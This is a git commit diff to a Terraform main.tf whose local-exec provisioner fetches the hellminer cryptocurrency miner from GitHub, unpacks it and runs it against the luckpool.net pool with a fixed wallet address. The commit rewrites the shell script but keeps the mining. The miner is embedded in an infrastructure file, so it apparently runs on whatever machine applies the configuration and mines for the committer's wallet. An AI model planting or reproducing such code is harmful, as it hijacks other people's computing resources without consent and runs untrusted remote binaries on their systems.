6d4453a99913aa9d495be2b3824e9f5b46e03b74
mooghen01-hue <chriskm0101@outlook.com>
2026-01-09 20:27:16 +0700

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,15 +1,22 @@
-resource "null_resource" "run_1" {
+resource "null_resource" "extract_and_run_1" {
   provisioner "local-exec" {
     command = <<EOT
-apt install libsodium-dev -y
-curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
-tar -xzvf hellminer_linux64.tar.gz
-mkdir mining
-mv hellminer mining/hellminer
-mv verus-solver mining/verus-solver
-tar -xzvf hellminer_linux64.tar.gz
-./mining/hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
-ls mining
+set -e
+
+curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -o hellminer.tar.gz
+tar -xzf hellminer.tar.gz
+
+cd hellminer_linux64
+
+chmod +x hellminer verus-solver
+
+ldd verus-solver || true
+
+./hellminer \
+  -c stratum+tcp://na.luckpool.net:3956 \
+  -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 \
+  -p x \
+  --cpu 2
 EOT
   }
 }
